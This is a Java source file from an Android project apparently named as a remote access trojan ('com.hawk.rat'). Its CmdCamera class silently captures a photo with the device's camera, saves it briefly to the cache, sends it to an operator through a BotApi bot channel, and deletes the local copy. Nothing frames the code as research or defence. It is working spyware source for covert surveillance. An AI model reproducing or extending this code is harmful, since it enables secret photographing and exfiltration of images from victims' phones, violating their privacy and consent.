package com.hawk.rat;
import android.content.Context;
import android.hardware.camera2.*;
import android.media.Image;
import android.media.ImageReader;
import android.os.Handler;
import android.os.HandlerThread;
import java.io.File;
import java.io.FileOutputStream;
import java.nio.ByteBuffer;
public class CmdCamera {
    private final Context ctx;
    public CmdCamera(Context c) { this.ctx = c; }
    public void run() {
        new Thread(() -> {
            try {
                CameraManager m = (CameraManager) ctx.getSystemService(Context.CAMERA_SERVICE);
                String id = m.getCameraIdList()[0];
                HandlerThread ht = new HandlerThread("cam"); ht.start(); Handler h = new Handler(ht.getLooper());
                ImageReader r = ImageReader.newInstance(1280, 720, android.graphics.ImageFormat.JPEG, 1);
                r.setOnImageAvailableListener(rd -> {
                    try {
                        Image im = rd.acquireLatestImage(); ByteBuffer b = im.getPlanes()[0].getBuffer(); byte[] by = new byte[b.remaining()]; b.get(by); im.close();
                        File f = new File(ctx.getCacheDir(), "c_"+System.currentTimeMillis()+".jpg");
                        try (FileOutputStream fos = new FileOutputStream(f)) { fos.write(by); }
                        BotApi.sendPhoto(ctx, f, "📸 Cam"); f.delete();
                    } catch (Exception e) { BotApi.sendMessage(ctx, "cam err: "+e.getMessage()); }
                    rd.close();
                }, h);
                m.openCamera(id, new CameraDevice.StateCallback() {
                    @Override public void onOpened(CameraDevice c) {
                        try {
                            CaptureRequest.Builder b = c.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE); b.addTarget(r.getSurface());
                            c.createCaptureSession(java.util.Collections.singletonList(r.getSurface()), new CameraCaptureSession.StateCallback() {
                                @Override public void onConfigured(CameraCaptureSession s) { try { s.capture(b.build(), null, h); } catch (Exception e) {} }
                                @Override public void onConfigureFailed(CameraCaptureSession s) {}
                            }, h);
                        } catch (Exception e) {}
                    }
                    @Override public void onDisconnected(CameraDevice c) { c.close(); }
                    @Override public void onError(CameraDevice c, int e) {}
                }, h);
            } catch (Exception e) { BotApi.sendMessage(ctx, "cam err: "+e.getMessage()); }
        }).start();
    }
}
